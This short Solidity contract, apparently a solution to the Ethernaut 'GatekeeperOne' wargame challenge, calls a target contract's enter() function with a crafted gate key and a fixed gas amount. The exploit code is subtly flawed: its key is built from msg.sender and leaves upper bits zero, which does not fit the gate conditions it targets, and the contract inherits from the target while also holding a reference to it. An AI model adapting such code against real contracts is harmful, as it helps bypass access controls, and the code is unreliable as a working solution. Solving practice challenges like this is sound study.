// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack is GatekeeperOne {
    GatekeeperOne gatekeeperOne;

    constructor(address _gatekeeperContract) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperContract);
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint16(msg.sender)));
        gatekeeperOne.enter{gas: 8191}(gateKey);
    }
}
